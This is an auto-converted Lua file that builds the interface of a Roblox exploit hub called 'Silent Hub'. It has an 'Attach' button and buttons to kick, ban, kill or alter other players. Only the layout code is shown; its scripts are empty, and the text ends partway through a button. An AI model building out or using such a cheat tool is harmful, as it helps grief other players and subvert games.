--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 326 | Scripts: 93 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.Silent Hub
G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"));
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["DisplayOrder"] = 999999999;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
G2L["1"]["Name"] = [[Silent Hub]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.Silent Hub.Main
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Size"] = UDim2.new(0, 500, 0, 31);
G2L["2"]["Position"] = UDim2.new(0.42266, 0, 0.34465, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[Main]];
G2L["2"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Silent Hub.Main.UIDrag
G2L["3"] = Instance.new("LocalScript", G2L["2"]);
G2L["3"]["Name"] = [[UIDrag]];


-- StarterGui.Silent Hub.Main.Title
G2L["4"] = Instance.new("TextLabel", G2L["2"]);
G2L["4"]["TextWrapped"] = true;
G2L["4"]["BorderSizePixel"] = 0;
G2L["4"]["TextSize"] = 14;
G2L["4"]["TextTransparency"] = 0.1;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4"]["BackgroundTransparency"] = 1;
G2L["4"]["Size"] = UDim2.new(0, 100, 0, 20);
G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["Text"] = [[Silent Hub]];
G2L["4"]["Name"] = [[Title]];
G2L["4"]["Position"] = UDim2.new(0.4, 0, 0, 0);


-- StarterGui.Silent Hub.Main.MainContainer
G2L["5"] = Instance.new("Frame", G2L["2"]);
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(66, 66, 66);
G2L["5"]["Size"] = UDim2.new(0, 500, 0, 251);
G2L["5"]["Position"] = UDim2.new(0, 0, 0.64516, 0);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Name"] = [[MainContainer]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages
G2L["6"] = Instance.new("Folder", G2L["5"]);
G2L["6"]["Name"] = [[Pages]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.StartingPage
G2L["7"] = Instance.new("Frame", G2L["6"]);
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(66, 66, 66);
G2L["7"]["Size"] = UDim2.new(0, 500, 0, 223);
G2L["7"]["Position"] = UDim2.new(0, 0, 0, 0);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Name"] = [[StartingPage]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.StartingPage.Message
G2L["8"] = Instance.new("TextLabel", G2L["7"]);
G2L["8"]["TextWrapped"] = true;
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["TextSize"] = 20;
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["8"]["BackgroundTransparency"] = 1;
G2L["8"]["RichText"] = true;
G2L["8"]["Size"] = UDim2.new(0, 500, 0, 49);
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Text"] = [[<font weight="heavy" size="25">Welcome to Silent Hub!</font><br/><font size="15">To get started, press the attach button below.</font>]];
G2L["8"]["Name"] = [[Message]];
G2L["8"]["Position"] = UDim2.new(0, 0, 0.22422, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.StartingPage.Message.UIStroke
G2L["9"] = Instance.new("UIStroke", G2L["8"]);
G2L["9"]["Color"] = Color3.fromRGB(50, 50, 50);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.StartingPage.Attach
G2L["a"] = Instance.new("TextButton", G2L["7"]);
G2L["a"]["TextWrapped"] = true;
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["AutoButtonColor"] = false;
G2L["a"]["TextSize"] = 18;
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["a"]["RichText"] = true;
G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["a"]["Size"] = UDim2.new(0, 150, 0, 35);
G2L["a"]["Name"] = [[Attach]];
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Text"] = [[Attach]];
G2L["a"]["Position"] = UDim2.new(0.35, 0, 0.48857, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.StartingPage.Attach.Attach
G2L["b"] = Instance.new("LocalScript", G2L["a"]);
G2L["b"]["Name"] = [[Attach]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.StartingPage.Attach.UIStroke
G2L["c"] = Instance.new("UIStroke", G2L["a"]);
G2L["c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["c"]["Thickness"] = 1.8;
G2L["c"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.StartingPage.UpdateDate
G2L["d"] = Instance.new("TextLabel", G2L["7"]);
G2L["d"]["TextWrapped"] = true;
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["TextSize"] = 15;
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["d"]["BackgroundTransparency"] = 1;
G2L["d"]["Size"] = UDim2.new(0, 500, 0, 30);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["Text"] = [[last updated here idk]];
G2L["d"]["Name"] = [[UpdateDate]];
G2L["d"]["Position"] = UDim2.new(0, 0, 0.64126, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.StartingPage.UpdateDate.UIStroke
G2L["e"] = Instance.new("UIStroke", G2L["d"]);
G2L["e"]["Color"] = Color3.fromRGB(50, 50, 50);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.StartingPage.UpdateDate.LocalScript
G2L["f"] = Instance.new("LocalScript", G2L["d"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players
G2L["10"] = Instance.new("Frame", G2L["6"]);
G2L["10"]["Visible"] = false;
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(66, 66, 66);
G2L["10"]["Size"] = UDim2.new(0, 500, 0, 223);
G2L["10"]["Position"] = UDim2.new(0, 0, 0, 0);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Name"] = [[Players]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main
G2L["11"] = Instance.new("Frame", G2L["10"]);
G2L["11"]["BorderSizePixel"] = 0;
G2L["11"]["BackgroundColor3"] = Color3.fromRGB(66, 66, 66);
G2L["11"]["Size"] = UDim2.new(0, 300, 0, 188);
G2L["11"]["Position"] = UDim2.new(0.4, 0, 0.15695, 0);
G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["Name"] = [[Main]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.PlayerName
G2L["12"] = Instance.new("TextBox", G2L["11"]);
G2L["12"]["Name"] = [[PlayerName]];
G2L["12"]["PlaceholderColor3"] = Color3.fromRGB(75, 75, 75);
G2L["12"]["BorderSizePixel"] = 0;
G2L["12"]["TextWrapped"] = true;
G2L["12"]["TextSize"] = 14;
G2L["12"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(223, 223, 223);
G2L["12"]["RichText"] = true;
G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12"]["PlaceholderText"] = [[Player Name]];
G2L["12"]["Size"] = UDim2.new(0, 235, 0, 20);
G2L["12"]["Position"] = UDim2.new(0.10667, 0, 0.04255, 0);
G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["Text"] = [[]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.PlayerName.UIStroke
G2L["13"] = Instance.new("UIStroke", G2L["12"]);
G2L["13"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["13"]["Thickness"] = 1.8;
G2L["13"]["Color"] = Color3.fromRGB(116, 116, 116);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Input
G2L["14"] = Instance.new("TextBox", G2L["11"]);
G2L["14"]["Name"] = [[Input]];
G2L["14"]["PlaceholderColor3"] = Color3.fromRGB(75, 75, 75);
G2L["14"]["BorderSizePixel"] = 0;
G2L["14"]["TextWrapped"] = true;
G2L["14"]["TextSize"] = 14;
G2L["14"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(223, 223, 223);
G2L["14"]["RichText"] = true;
G2L["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14"]["PlaceholderText"] = [[Input]];
G2L["14"]["Size"] = UDim2.new(0, 235, 0, 20);
G2L["14"]["Position"] = UDim2.new(0.10667, 0, 0.18617, 0);
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Text"] = [[]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Input.UIStroke
G2L["15"] = Instance.new("UIStroke", G2L["14"]);
G2L["15"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["15"]["Thickness"] = 1.8;
G2L["15"]["Color"] = Color3.fromRGB(116, 116, 116);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent
G2L["16"] = Instance.new("ScrollingFrame", G2L["11"]);
G2L["16"]["Active"] = true;
G2L["16"]["BorderSizePixel"] = 0;
G2L["16"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(64, 64, 64);
G2L["16"]["Name"] = [[Dependent]];
G2L["16"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
G2L["16"]["Size"] = UDim2.new(0, 300, 0, 120);
G2L["16"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["Position"] = UDim2.new(0, 0, 0.35991, 0);
G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["ScrollBarThickness"] = 5;


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.UIListLayout
G2L["17"] = Instance.new("UIListLayout", G2L["16"]);
G2L["17"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["17"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["17"]["Wraps"] = true;
G2L["17"]["Padding"] = UDim.new(0.04, 0);
G2L["17"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["17"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["17"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button
G2L["18"] = Instance.new("TextButton", G2L["16"]);
G2L["18"]["TextWrapped"] = true;
G2L["18"]["BorderSizePixel"] = 0;
G2L["18"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["TextSize"] = 12;
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["18"]["RichText"] = true;
G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["18"]["Size"] = UDim2.new(0, 65, 0, 51);
G2L["18"]["Name"] = [[Button]];
G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18"]["Text"] = [[Chat]];
G2L["18"]["Position"] = UDim2.new(0.02667, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.LocalScript
G2L["19"] = Instance.new("LocalScript", G2L["18"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.UIStroke
G2L["1a"] = Instance.new("UIStroke", G2L["18"]);
G2L["1a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["1a"]["Thickness"] = 1.8;
G2L["1a"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button
G2L["1b"] = Instance.new("TextButton", G2L["16"]);
G2L["1b"]["TextWrapped"] = true;
G2L["1b"]["BorderSizePixel"] = 0;
G2L["1b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b"]["TextSize"] = 12;
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["1b"]["RichText"] = true;
G2L["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b"]["Size"] = UDim2.new(0, 65, 0, 51);
G2L["1b"]["Name"] = [[Button]];
G2L["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["Text"] = [[Change WalkSpeed]];
G2L["1b"]["Position"] = UDim2.new(0.27, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.LocalScript
G2L["1c"] = Instance.new("LocalScript", G2L["1b"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.UIStroke
G2L["1d"] = Instance.new("UIStroke", G2L["1b"]);
G2L["1d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["1d"]["Thickness"] = 1.8;
G2L["1d"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button
G2L["1e"] = Instance.new("TextButton", G2L["16"]);
G2L["1e"]["TextWrapped"] = true;
G2L["1e"]["BorderSizePixel"] = 0;
G2L["1e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["TextSize"] = 12;
G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["1e"]["RichText"] = true;
G2L["1e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1e"]["Size"] = UDim2.new(0, 65, 0, 51);
G2L["1e"]["Name"] = [[Button]];
G2L["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e"]["Text"] = [[Change JumpPower]];
G2L["1e"]["Position"] = UDim2.new(0.51333, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.LocalScript
G2L["1f"] = Instance.new("LocalScript", G2L["1e"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.UIStroke
G2L["20"] = Instance.new("UIStroke", G2L["1e"]);
G2L["20"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["20"]["Thickness"] = 1.8;
G2L["20"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button
G2L["21"] = Instance.new("TextButton", G2L["16"]);
G2L["21"]["TextWrapped"] = true;
G2L["21"]["BorderSizePixel"] = 0;
G2L["21"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21"]["TextSize"] = 12;
G2L["21"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["21"]["RichText"] = true;
G2L["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["21"]["Size"] = UDim2.new(0, 65, 0, 51);
G2L["21"]["Name"] = [[Button]];
G2L["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["Text"] = [[Change Appearance]];
G2L["21"]["Position"] = UDim2.new(0.75667, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.LocalScript
G2L["22"] = Instance.new("LocalScript", G2L["21"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.UIStroke
G2L["23"] = Instance.new("UIStroke", G2L["21"]);
G2L["23"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["23"]["Thickness"] = 1.8;
G2L["23"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button
G2L["24"] = Instance.new("TextButton", G2L["16"]);
G2L["24"]["TextWrapped"] = true;
G2L["24"]["BorderSizePixel"] = 0;
G2L["24"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["24"]["TextSize"] = 12;
G2L["24"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["24"]["RichText"] = true;
G2L["24"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["24"]["Size"] = UDim2.new(0, 65, 0, 51);
G2L["24"]["Name"] = [[Button]];
G2L["24"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["24"]["Text"] = [[Insert Tool]];
G2L["24"]["Position"] = UDim2.new(0.02667, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.LocalScript
G2L["25"] = Instance.new("LocalScript", G2L["24"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.UIStroke
G2L["26"] = Instance.new("UIStroke", G2L["24"]);
G2L["26"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["26"]["Thickness"] = 1.8;
G2L["26"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button
G2L["27"] = Instance.new("TextButton", G2L["16"]);
G2L["27"]["TextWrapped"] = true;
G2L["27"]["BorderSizePixel"] = 0;
G2L["27"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27"]["TextSize"] = 12;
G2L["27"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["27"]["RichText"] = true;
G2L["27"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["27"]["Size"] = UDim2.new(0, 65, 0, 51);
G2L["27"]["Name"] = [[Button]];
G2L["27"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27"]["Text"] = [[Change Size]];
G2L["27"]["Position"] = UDim2.new(0.27, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.LocalScript
G2L["28"] = Instance.new("LocalScript", G2L["27"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.UIStroke
G2L["29"] = Instance.new("UIStroke", G2L["27"]);
G2L["29"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["29"]["Thickness"] = 1.8;
G2L["29"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button
G2L["2a"] = Instance.new("TextButton", G2L["16"]);
G2L["2a"]["TextWrapped"] = true;
G2L["2a"]["BorderSizePixel"] = 0;
G2L["2a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a"]["TextSize"] = 12;
G2L["2a"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["2a"]["RichText"] = true;
G2L["2a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2a"]["Size"] = UDim2.new(0, 65, 0, 51);
G2L["2a"]["Name"] = [[Button]];
G2L["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a"]["Text"] = [[Change Health]];
G2L["2a"]["Position"] = UDim2.new(0.02667, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.LocalScript
G2L["2b"] = Instance.new("LocalScript", G2L["2a"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.UIStroke
G2L["2c"] = Instance.new("UIStroke", G2L["2a"]);
G2L["2c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2c"]["Thickness"] = 1.8;
G2L["2c"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button
G2L["2d"] = Instance.new("TextButton", G2L["16"]);
G2L["2d"]["TextWrapped"] = true;
G2L["2d"]["BorderSizePixel"] = 0;
G2L["2d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d"]["TextSize"] = 12;
G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["2d"]["RichText"] = true;
G2L["2d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2d"]["Size"] = UDim2.new(0, 65, 0, 51);
G2L["2d"]["Name"] = [[Button]];
G2L["2d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d"]["Text"] = [[Set Team]];
G2L["2d"]["Position"] = UDim2.new(0.02667, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.LocalScript
G2L["2e"] = Instance.new("LocalScript", G2L["2d"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.UIStroke
G2L["2f"] = Instance.new("UIStroke", G2L["2d"]);
G2L["2f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2f"]["Thickness"] = 1.8;
G2L["2f"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent
G2L["30"] = Instance.new("ScrollingFrame", G2L["10"]);
G2L["30"]["Active"] = true;
G2L["30"]["BorderSizePixel"] = 0;
G2L["30"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["30"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["30"]["Name"] = [[Independent]];
G2L["30"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
G2L["30"]["Size"] = UDim2.new(0, 200, 0, 189);
G2L["30"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30"]["Position"] = UDim2.new(0, 0, 0.15247, 0);
G2L["30"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30"]["ScrollBarThickness"] = 5;


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button
G2L["31"] = Instance.new("TextButton", G2L["30"]);
G2L["31"]["TextWrapped"] = true;
G2L["31"]["BorderSizePixel"] = 0;
G2L["31"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31"]["TextSize"] = 12;
G2L["31"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["31"]["RichText"] = true;
G2L["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["31"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["31"]["Name"] = [[Button]];
G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31"]["Text"] = [[Kick]];
G2L["31"]["Position"] = UDim2.new(0.49852, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
G2L["32"] = Instance.new("LocalScript", G2L["31"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.UIStroke
G2L["33"] = Instance.new("UIStroke", G2L["31"]);
G2L["33"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["33"]["Thickness"] = 1.8;
G2L["33"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.UIListLayout
G2L["34"] = Instance.new("UIListLayout", G2L["30"]);
G2L["34"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["34"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["34"]["Wraps"] = true;
G2L["34"]["VerticalFlex"] = Enum.UIFlexAlignment.SpaceBetween;
G2L["34"]["Padding"] = UDim.new(0.05, 0);
G2L["34"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["34"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["34"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button
G2L["35"] = Instance.new("TextButton", G2L["30"]);
G2L["35"]["TextWrapped"] = true;
G2L["35"]["BorderSizePixel"] = 0;
G2L["35"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["35"]["TextSize"] = 12;
G2L["35"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["35"]["RichText"] = true;
G2L["35"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["35"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["35"]["Name"] = [[Button]];
G2L["35"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["35"]["Text"] = [[Ban]];
G2L["35"]["Position"] = UDim2.new(0.49852, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
G2L["36"] = Instance.new("LocalScript", G2L["35"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.UIStroke
G2L["37"] = Instance.new("UIStroke", G2L["35"]);
G2L["37"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["37"]["Thickness"] = 1.8;
G2L["37"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button
G2L["38"] = Instance.new("TextButton", G2L["30"]);
G2L["38"]["TextWrapped"] = true;
G2L["38"]["BorderSizePixel"] = 0;
G2L["38"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["38"]["TextSize"] = 12;
G2L["38"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["38"]["RichText"] = true;
G2L["38"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["38"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["38"]["Name"] = [[Button]];
G2L["38"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["38"]["Text"] = [[Kill]];
G2L["38"]["Position"] = UDim2.new(0.49852, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
G2L["39"] = Instance.new("LocalScript", G2L["38"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.UIStroke
G2L["3a"] = Instance.new("UIStroke", G2L["38"]);
G2L["3a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["3a"]["Thickness"] = 1.8;
G2L["3a"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button
G2L["3b"] = Instance.new("TextButton", G2L["30"]);
G2L["3b"]["TextWrapped"] = true;
G2L["3b"]["BorderSizePixel"] = 0;
G2L["3b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3b"]["TextSize"] = 12;
G2L["3b"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["3b"]["RichText"] = true;
